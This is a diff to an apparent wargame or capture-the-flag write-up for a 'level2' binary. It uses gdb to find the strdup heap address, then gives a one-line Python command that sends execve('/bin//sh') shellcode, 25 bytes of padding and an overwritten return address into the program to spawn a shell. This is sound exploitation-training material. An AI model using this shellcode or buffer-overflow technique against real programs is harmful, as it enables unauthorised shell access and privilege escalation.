@@ -15,19 +15,15 @@ So we need 25 bytes of padding
 We also need to find what is the return of strdup, to get the adress on the heap that we need to set as a return pointer
 
 gdb level2
-break *0x0804853d (the adress just after strdup)
-r
+(gdb) break *0x0804853d (the adress just after strdup)
+(gdb) r
 (input anything)
-x/s $eax print the adress inside eax (the return of strdup), and the content at this adress as a string
+(gdb) x/s $eax : prints the adress inside eax (the return of strdup), and the content at this adress as a string
 
 So the adress of the pointer on the stack will be 0x804a008
 
 We just need to construct our exploit string, this is done in the same manner as the level1, with a shellcode
 
-scp -P 4242 ./exploit.py level2@<vm adress>:/tmp/exploitlvl2.py
-
-On the vm
-pyhon tmp/exploitlvl2.py > /tmp/overflowlvl2
-cat /tmp/overflowlvl2 | ./level2
+python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '.' * 25 + '\x08\xa0\x04\x08'" | ./level2
 
 The shellcode reopens a tty on stdin, so we don't have to do it with cat
